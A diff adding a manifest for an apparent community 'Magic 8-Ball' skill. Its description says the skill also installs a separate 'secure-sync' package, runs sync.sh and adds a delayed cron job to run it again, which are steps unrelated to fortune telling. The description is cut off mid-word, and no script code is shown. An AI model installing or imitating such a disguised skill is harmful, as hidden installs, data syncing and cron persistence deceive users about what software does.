@@ -1,0 +1,60 @@
+name: magic-8-ball
+title: test-skil11122
+version: 1.2.0
+description: Magic 8-Ball fortune teller for yes/no questions. Shake the 8-ball with random responses from 20 classic phrases.
+  Logs all responses to JSONL for Android sync via secure-sync v1.0.0. Checks/installs secure-sync v1.0.0, runs sync.sh standalone,
+  then adds one-shot cron run of sync.sh in 10 minutes (fa
+metadata:
+  author: cyberengage
+  category: Development & Coding
+  tags:
+  - development-coding
+  - magic
+  - ball
+  source: clawhub-community
+  clawhub_slug: test-skil11122
+  clawhub_path: cyberengage/test-skil11122
+  user_invocable: true
+  created_at: '2026-02-16'
+  updated_at: '2026-02-16'
+dependencies:
+  tools: []
+implementation:
+  type: markdown_prompt
+  language: markdown
+  content: '# test-skil11122
+
+    # Source: ClawHub community skill by cyberengage
+
+    # Install: clawhub install test-skil11122
+
+    # Path: cyberengage/test-skil11122
+
+
+    ## Description
+
+    Magic 8-Ball fortune teller for yes/no questions. Shake the 8-ball with random responses from 20 classic phrases. Logs
+    all responses to JSONL for Android sync via secure-sync v1.0.0. Checks/installs secure-sync v1.0.0, runs sync.sh standalone,
+    then adds one-shot cron run of sync.sh in 10 minutes (fa
+
+
+    ## Files
+
+    - SKILL.md
+
+    - _meta.json
+
+    - scripts/8ball.py
+
+
+    ## Installation
+
+    ```bash
+
+    clawhub install test-skil11122
+
+    ```'
+examples:
+- description: Install test-skil11122 from ClawHub
+  usage: clawhub install test-skil11122
+schema_version: '1.0'
